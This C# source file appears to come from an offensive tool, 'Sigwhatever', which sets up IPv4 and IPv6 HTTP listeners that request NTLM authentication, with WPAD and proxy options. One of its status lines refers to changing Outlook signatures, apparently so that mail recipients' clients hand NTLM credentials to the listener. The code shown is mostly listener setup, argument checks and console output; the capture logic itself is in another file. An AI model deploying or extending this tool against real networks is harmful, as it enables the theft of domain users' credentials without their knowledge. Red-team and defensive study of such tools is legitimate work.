using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Collections;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Sigwhatever
{
    class TCPHTTPCap
    {
        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
        public static IList<string> outputList = new List<string>();
        static IList<string> consoleList = new List<string>();
        public static bool consoleOutput = true;
        public static bool enabledHTTP = false;
        public static bool enabledInspect = false;
        public static bool enabledProxy = false;
        //begin parameters - set defaults as needed before compile

        public static string argFileOutputDirectory = System.IO.Directory.GetCurrentDirectory();
        public static string argFilePrefix = "Log";
        public static string key = RandomString(10, false);
        public static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }
        public void Doit(string HTTPPort, string Logfile, string argChallenge)
        {
            string argHTTP = "Y";
            string argHTTPAuth = "NTLM";
            string argHTTPBasicRealm = "ADFS";
            string argHTTPIP = "0.0.0.0";
            string argHTTPPort = HTTPPort;
            string argHTTPResponse = "";
            string argIP = "";
            bool argInspect = false;
            string argProxyAuth = "NTLM";
            string[] argProxyIgnore = { "Firefox" };
            string argProxyIP = "0.0.0.0";
            string argProxyPort = "8492";
            string argWPADAuth = "NTLM";
            string[] argWPADAuthIgnore = { "Firefox" };

            string argWPADResponse = "function FindProxyForURL(url,host) {return \"DIRECT\";}";
            //end parameters

            string computerName = Environment.MachineName;
            string netbiosDomain = Environment.UserDomainName;
            string dnsDomain = "";
            int consoleQueueLimit = -1;
            int consoleStatus = 0;
            int runCount = 0;
            int runTime = 0;
            
            try
            {
                dnsDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            catch
            {
                dnsDomain = netbiosDomain;
            }

            Regex r = new Regex("^[A-Fa-f0-9]{16}$"); if (!String.IsNullOrEmpty(argChallenge) && !r.IsMatch(argChallenge)) { throw new ArgumentException("Challenge is invalid"); }
            try { IPAddress.Parse(argHTTPIP); } catch { throw new ArgumentException("HTTPIP value must be an IP address"); }
            try { Int32.Parse(argHTTPPort); } catch { throw new ArgumentException("HTTPPort value must be a integer"); }
            if (!String.IsNullOrEmpty(argIP)) { try { IPAddress.Parse(argIP); } catch { throw new ArgumentException("IP value must be an IP address"); } }
            if (!String.Equals(argHTTPAuth, "ANONYMOUS") && !String.Equals(argHTTPAuth, "BASIC") && !String.Equals(argHTTPAuth, "NTLM") && !String.Equals(argHTTPAuth, "NTLMNOESS")) throw new ArgumentException("HTTPAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS");

            if (!String.Equals(argProxyAuth, "BASIC") && !String.Equals(argWPADAuth, "NTLM") && !String.Equals(argWPADAuth, "NTLMNOESS") && !String.Equals(argWPADAuth, "ANONYMOUS")) throw new ArgumentException("WPADAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS");

            if (String.Equals(argHTTP, "Y")) { enabledHTTP = true; }
            if (argInspect) { enabledInspect = true; }

            if (string.IsNullOrEmpty(argIP))
            {
                argIP = Util.GetLocalIPAddress("IPv4");
            }

            string version = "0.913";
            string optionStatus = "";
            outputList.Add(String.Format("[+] HTTPCap {0} started at {1}", version, DateTime.Now.ToString("s")));
            outputList.Add(String.Format("[+] Encryption Password is: " + key));

            //            if (enabledHTTP) optionStatus = "Enabled";
            //            else optionStatus = "Disabled";
            //            outputList.Add(String.Format("[+] HTTP Capture = {0}", optionStatus));
            //
            //            if (enabledHTTP)
            //            {
            if (!String.IsNullOrEmpty(argChallenge)) outputList.Add(String.Format("[+] HTTP NTLM Challenge = {0}", argChallenge));
            outputList.Add(String.Format("[+] HTTP Authentication = {0}", argHTTPAuth));
            if (!String.Equals(argHTTPIP, "0.0.0.0")) outputList.Add(String.Format("[+] HTTP IP = {0}", argHTTPIP));
            if (!String.Equals(argHTTPPort, "80")) outputList.Add(String.Format("[+] HTTP Port = {0}", argHTTPPort));
            if (!String.IsNullOrEmpty(argHTTPResponse)) outputList.Add("[+] HTTP Response = Enabled");
            outputList.Add("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
            //            }

            if (String.Equals(argHTTPAuth, "BASIC") || String.Equals(argProxyAuth, "BASIC") || String.Equals(argWPADAuth, "BASIC")) { Console.WriteLine("[+] Basic Authentication Realm = " + argHTTPBasicRealm); }  

            if (enabledHTTP)
            {
                Thread httpListenerThread = new Thread(() => TCPHTTP.HTTPListener(argHTTPIP, argHTTPPort, "IPv4", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argHTTPAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, false, Logfile));
                httpListenerThread.Start();

                Thread httpListenerIPv6Thread = new Thread(() => TCPHTTP.HTTPListener(argHTTPIP, argHTTPPort, "IPv6", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argHTTPAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, false, Logfile));
                httpListenerIPv6Thread.Start();
            }

            if (enabledProxy)
            {
                Thread proxyListenerThread = new Thread(() => TCPHTTP.HTTPListener(argProxyIP, argProxyPort, "IPv4", argChallenge, computerName, dnsDomain, netbiosDomain, argHTTPBasicRealm, argProxyAuth, argHTTPResponse, argWPADAuth, argWPADResponse, argWPADAuthIgnore, argProxyIgnore, true, Logfile));
                proxyListenerThread.Start();
            }

            Thread controlThread = new Thread(() => ControlLoop(consoleQueueLimit, consoleStatus, runCount, runTime));
            controlThread.Start();

            while (true)
            {
                try
                {
                    OutputLoop();
                    System.Threading.Thread.Sleep(5);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(outputList.Count);
                    Program.outputList.Add(String.Format("[-] [{0}] Console error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }
            }
        }

        static void OutputLoop()
        {
            do
            {
                while (consoleOutput)
                {
                    while (consoleList.Count > 0)
                    {
                        ConsoleOutputFormat(consoleList[0]);
                        consoleList.RemoveAt(0);
                    }
                    System.Threading.Thread.Sleep(5);
                }
            } while (consoleOutput);
        }

        static void ConsoleOutputFormat(string consoleEntry)
        {
            if (String.IsNullOrEmpty(consoleEntry))
            {
                consoleEntry = "";
            }

            if (consoleEntry.StartsWith("[*]"))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(consoleEntry);
                Console.ResetColor();
            }
            else if (consoleEntry.StartsWith("[+]"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(consoleEntry);
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine(consoleEntry);
            }

        }

        static void ControlLoop(int consoleQueueLimit, int consoleStatus, int runCount, int runTime)
        {
            Stopwatch stopwatchConsoleStatus = new Stopwatch();
            stopwatchConsoleStatus.Start();
            Stopwatch stopwatchRunTime = new Stopwatch();
            stopwatchRunTime.Start();

            while (true)
            {
                try
                {
                    while (outputList.Count > 0)
                    {
                        consoleList.Add(outputList[0]);
         
                        lock (outputList)
                        {
                            outputList.RemoveAt(0);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Output error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }
                Thread.Sleep(5);
            }
        }
    }
}